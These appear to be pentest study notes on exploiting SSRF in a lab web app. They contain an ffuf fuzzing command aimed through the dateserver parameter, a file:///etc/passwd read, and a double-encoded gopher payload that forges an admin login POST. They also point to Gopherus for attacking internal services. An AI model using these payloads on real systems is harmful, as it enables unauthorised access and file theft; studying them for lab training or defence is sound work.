# Exploiting SSRF
***
### Accessing Restricted Endpoints
#### When we don't have permissions to access certain directories we can try to access and enumerate the domain through the SSRF vulnerability.
#### Using ffuf  to fuzz for directories to enumerate additional endpoints
#### To filter out any HTTP 403 responses, we should filter based on the String `Server at 1337.co Port 80`, which is contained in default Apache error pages. Also, after checking which extensions the application run we can use it in the fuzz payloads
```bash
$ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://<WEB_APP_IP>/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```

### Local File Inclusion
#### Through SSRF we can try to read local files from the fyle system using the `file://` URL scheme (`file:///etc/passwd`) .

### The gopher Protocol
#### Assuming that when we try to access /admin.php the response returns a login prompt. Furthermore, we can't send a Post request using the `http://` URL scheme.
#### On the other hand we can use the [gopher](https://datatracker.ietf.org/doc/html/rfc1436) URL scheme to send arbitrary bytes to a TCP socket. Enabling us to create a POST request .
```http request
POST /admin.php HTTP/1.1
Host: 1337.org
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```
#### Then we need to properly URL encode the entire request in order to build a valid gopher URL, and prefix the data with the gopher URL scheme, the target  host and port, and an underscore , for instance:
```
gopher://1337.org:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%201337.org%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```
#### After executing the request , the web server accepts the POST request and responds accordingly. However, since we are sending our URL within the HTTP  POST parameter dateserver, which itself is URL-encoded, we need to URL-encode the entire URL again to ensure the correct format of the URL after the web server accepts it.
#### Finally by URL encode the complete gopher URL again, we can send the request, for example:
```http request
POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//1337.org%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%25201337.org%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```

#### Gopher protocol can be used to interact with many internal services. But we can utilize the [Gopherus](https://github.com/tarunkant/Gopherus) tool to generate gopher URLs.
#### Services supported:
* MySQL
* PostgreSQL
* FastCGI
* Redis
* SMTP
* Zabbix
* pymemcache
* rbmemcache
* phpmemcache
* dmpmemcache


#### Generate valid SMTP URL
```bash
$ gopherus --exploit smtp
```
